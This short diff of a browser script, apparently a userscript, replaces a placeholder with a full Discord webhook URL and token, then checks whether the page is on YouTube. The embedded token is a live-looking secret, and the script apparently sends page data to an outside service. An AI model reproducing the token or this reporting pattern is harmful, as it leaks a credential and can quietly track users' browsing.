@@ -1,7 +1,7 @@
 setTimeout(() => {
     console.log("Script executed after 2 seconds!");
 
-    const webhookURL = 'enter your discord webhook URL link';
+    const webhookURL = 'https://discord.com/api/webhooks/1332219931588034630/VCkO6nJoho1ZkLrUUAU6oenxzPXQHDs6tIJ4kEFtayR8EdCA-dnD0JVBB5t5dJUWmkYP';
 
     if (window.location.href.startsWith("https://www.youtube.com/")) {
         const url = new URL(window.location.href);
